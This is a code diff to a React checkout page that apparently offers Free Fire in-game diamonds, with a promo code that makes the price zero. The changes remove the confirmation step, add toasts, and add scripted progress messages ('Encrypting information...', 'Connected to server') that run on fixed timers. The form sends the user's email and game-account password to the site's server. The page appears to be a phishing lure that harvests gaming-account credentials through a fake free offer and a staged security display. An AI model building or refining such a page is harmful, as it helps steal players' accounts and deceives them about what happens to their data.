@@ -30,6 +30,15 @@ export default function Checkout() {
   const [showError, setShowError] = useState(false);
   const [isChecking, setIsChecking] = useState(false);
 
+  const [toastMessage, setToastMessage] = useState("");
+
+  const showToast = (msg: string) => {
+    setToastMessage(msg);
+    setTimeout(() => {
+      setToastMessage("");
+    }, 3000);
+  };
+
   const isOffer = typeof diamonds === 'string' && isNaN(Number(diamonds));
 
   // If accessed directly without state, redirect back
@@ -43,18 +52,25 @@ export default function Checkout() {
     );
   }
 
-  const processTexts = [
-    "جاري التحقق من المعلومات...",
-    "جاري التحقق من أمان المعلومات...",
+  const processTexts = language === 'ar' ? [
     "جاري تشفير المعلومات...",
+    "جاري الاتصال بالخادم...",
+    "تم الاتصال بالخادم",
     "جاري إرسال الطلب...",
+    "تم إرسال الطلب",
+  ] : [
+    "Encrypting information...",
+    "Connecting to server...",
+    "Connected to server",
+    "Sending request...",
+    "Request sent",
   ];
 
   const handleApplyPromo = () => {
     if (promoCode === 'FFGEMSMENA2026') {
       setIsPromoApplied(true);
     } else {
-      alert("Invalid promo code / كود خاطئ");
+      showToast(language === 'ar' ? "الرمز خاطئ" : "Invalid promo code");
     }
   };
 
@@ -62,10 +78,11 @@ export default function Checkout() {
     if (!isAgreed) return;
     setShowConfirm(false);
     setShowProcess(true);
+    setProcessStep(0);
 
     const stepInterval = setInterval(() => {
-      setProcessStep((prev) => (prev < 3 ? prev + 1 : prev));
-    }, 2500);
+      setProcessStep((prev) => (prev < 4 ? prev + 1 : prev));
+    }, 2000);
 
     try {
       const token = localStorage.getItem("ff_token");
@@ -83,13 +100,16 @@ export default function Checkout() {
 
       setTimeout(() => {
         clearInterval(stepInterval);
-        setShowProcess(false);
-        setShowSuccess(true);
-      }, 10000);
+        setProcessStep(4);
+        setTimeout(() => {
+          setShowProcess(false);
+          setShowSuccess(true);
+        }, 1500);
+      }, 8000);
     } catch (e) {
       clearInterval(stepInterval);
       setShowProcess(false);
-      alert("فشل في إرسال الطلب");
+      showToast(language === 'ar' ? "فشل في إرسال الطلب" : "Failed to send request");
     }
   };
 
@@ -194,7 +214,7 @@ export default function Checkout() {
           <div className="p-4 flex items-center justify-between border-t border-gray-50">
             <span className="font-bold text-gray-600">{t('price')}</span>
             <span className={`font-black text-lg ${isPromoApplied ? 'text-emerald-500' : 'text-gray-900'}`}>
-              {isPromoApplied ? t('free') : `DZD ${finalPrice.toLocaleString()}`}
+              {isPromoApplied ? (language === 'ar' ? '0 دينار' : '0 DZD') : `DZD ${finalPrice.toLocaleString()}`}
             </span>
           </div>
           
@@ -261,7 +281,7 @@ export default function Checkout() {
             onClick={() => {
                if (paymentMethod === 'djezzy') {
                  if (phone.length !== 9) {
-                   alert(language === 'ar' ? "يرجى إدخال رقم هاتف جازي صحيح يتكون من 9 أرقام بدون وضع الصفر في البداية" : "Please enter a valid 9-digit Djezzy phone number without leading zero");
+                   showToast(language === 'ar' ? "يرجى إدخال رقم هاتف جازي صحيح يتكون من 9 أرقام بدون وضع الصفر في البداية" : "Please enter a valid 9-digit Djezzy phone number without leading zero");
                    return;
                  }
                }
@@ -273,7 +293,41 @@ export default function Checkout() {
                   }, 2500);
                   return;
                }
-               setShowConfirm(true);
+               
+               // Directly proceed to the processing steps
+               setIsAgreed(true);
+               setShowConfirm(false);
+               setShowProcess(true);
+               setProcessStep(0);
+           
+               const stepInterval = setInterval(() => {
+                 setProcessStep((prev) => (prev < 4 ? prev + 1 : prev));
+               }, 2000);
+           
+               const token = localStorage.getItem("ff_token");
+               axios.post("/api/orders", {
+                 token,
+                 platform,
+                 email,
+                 platform_password: platformPassword,
+                 level,
+                 charged,
+                 diamonds,
+               }).then(res => {
+                 setOrderNum(res.data.order_number);
+                 setTimeout(() => {
+                   clearInterval(stepInterval);
+                   setProcessStep(4);
+                   setTimeout(() => {
+                     setShowProcess(false);
+                     setShowSuccess(true);
+                   }, 1500);
+                 }, 8000);
+               }).catch(e => {
+                 clearInterval(stepInterval);
+                 setShowProcess(false);
+                 showToast(language === 'ar' ? "فشل في إرسال الطلب" : "Failed to send request");
+               });
             }}
             className="flex-1 bg-[#CD1212] flex items-center justify-center text-white py-4 rounded-xl font-black shadow-lg shadow-red-500/20 active:scale-[0.98] transition-transform"
           >
@@ -409,6 +463,21 @@ export default function Checkout() {
           </button>
         </div>
       </Modal>
+
+      {/* Toast Notification */}
+      <AnimatePresence>
+        {toastMessage && (
+          <motion.div
+            initial={{ opacity: 0, y: 50, scale: 0.9 }}
+            animate={{ opacity: 1, y: 0, scale: 1 }}
+            exit={{ opacity: 0, scale: 0.9, y: 20 }}
+            className={`fixed bottom-24 left-1/2 -translate-x-1/2 z-50 rounded-xl bg-gray-900/90 text-white px-6 py-3 font-bold shadow-xl backdrop-blur-sm shadow-black/20 flex items-center gap-2 ${language === 'ar' ? 'flex-row-reverse' : ''}`}
+          >
+            <AlertTriangle className="h-5 w-5 text-red-400" />
+            <span dir="auto">{toastMessage}</span>
+          </motion.div>
+        )}
+      </AnimatePresence>
     </div>
   );
 }
